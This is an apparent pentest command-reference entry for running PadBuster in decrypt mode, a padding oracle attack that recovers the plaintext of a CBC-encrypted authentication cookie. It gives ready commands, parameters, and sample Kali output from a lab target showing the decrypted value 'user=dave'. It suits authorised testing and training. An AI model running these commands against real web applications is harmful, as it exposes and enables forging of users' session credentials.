---
id: e0bcfe1b-e00f-4078-a584-9085b8155695
type: command
executor: bash
data: >-
  perl PadBuster.pl $_TARGET_URL $_COOKIE $_BLOCK_SIZE -cookies
  $_COOKIE_NAME=$_COOKIE -encoding 0
output: >-
  root@kali:~# perl PadBuster.pl http://10.10.10.18
  vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2 8 --cookies
  'auth=vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2' -encoding 0
                                       
  +-------------------------------------------+

  | PadBuster - v0.3.3                        |

  | Brian Holyfield - Gotham Digital Science  |

  | labs@gdssecurity.com                      |

  +-------------------------------------------+
                                       
  INFO: The original request returned the following

  [+] Status: 200

  [+] Location: N/A

  [+] Content Length: 978                                                    
                                                                             
  INFO: Starting PadBuster Decrypt Mode 

  *** Starting Block 1 of 2 ***
                                                                             
  INFO: No error string was provided...starting response analysis


  *** Response Analysis Complete ***                                         


  The following response signatures were returned:           


  -------------------------------------------------------

  ID#     Freq    Status  Length  Location

  -------------------------------------------------------

  1       1       200     1133    N/A

  2 **    255     200     15      N/A

  -------------------------------------------------------


  Enter an ID that matches the error condition

  NOTE: The ID# marked with ** is recommended : 2

  ...

  ...

  -------------------------------------------------------

  ** Finished ***


  [+] Decrypted value (ASCII): user=dave


  [+] Decrypted value (HEX): 757365723D6461766507070707070707


  [+] Decrypted value (Base64): dXNlcj1kYXZlBwcHBwcHBw==


  -------------------------------------------------------
created_at: '2019-10-24T00:47:43.801674+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - cryptography
  - web
verified: true
validated: true
---

# padbuster-decrypt-cookie

## Command

```bash
perl PadBuster.pl $_TARGET_URL $_COOKIE $_BLOCK_SIZE -cookies $_COOKIE_NAME=$_COOKIE -encoding 0
```

## Description

This command invokes PadBuster in decrypt mode to perform a padding oracle attack on an encrypted HTTP cookie. It sends modified ciphertext blocks to the target URL, analyzes server responses for padding validity, and reconstructs the plaintext iteratively. Use this when testing web applications with potentially vulnerable CBC-mode encryption in cookies, such as session data or authentication tokens.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The vulnerable web endpoint URL that processes and validates the cookie (e.g., http://example.com/login) | Yes |
| $_COOKIE | The encoded ciphertext value from the cookie to decrypt (e.g., Base64URL or hex string) | Yes |
| $_BLOCK_SIZE | Size of the cipher block in bytes (e.g., 8 for 3DES, 16 for AES-CBC) | Yes |
| -cookies $_COOKIE_NAME=$_COOKIE | HTTP cookie header to include in requests; $_COOKIE_NAME is the cookie's name (e.g., auth or session) | Yes |
| -encoding 0 | Encoding type for input/output: 0=raw bytes, 1=Base64URL, 2=hex | Yes |

## Examples

### Basic Usage

```bash
perl PadBuster.pl http://example.com/login vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2 8 -cookies auth=vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2 -encoding 0
```

Decrypts an 8-byte block ciphertext cookie named 'auth' from a login page.

### Advanced Usage

```bash
perl PadBuster.pl http://example.com/login $_COOKIE 16 -cookies session=$_COOKIE -encoding 1 --verbose --proxy http://127.0.0.1:8080
```

Decrypts a Base64URL-encoded AES cookie via a Burp proxy with verbose logging.

## Expected Output

The command is interactive: it first analyzes responses to identify the padding error signature, prompts for selection, then decrypts block-by-block. Successful output includes the revealed plaintext in multiple formats:

```
[+] Decrypted value (ASCII): user=dave
[+] Decrypted value (HEX): 757365723D6461766507070707070707
[+] Decrypted value (Base64): dXNlcj1kYXZlBwcHBwcHBw==
```

Response analysis might show:

```
-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     1133    N/A
2 **    255     200     15      N/A
-------------------------------------------------------
```

Where ID 2 indicates the padding error (e.g., short response length).

## Related

- [[tools/PadBuster]] (parent tool documentation)
- [[commands/padbuster-encrypt-plaintext]] (for encryption mode)
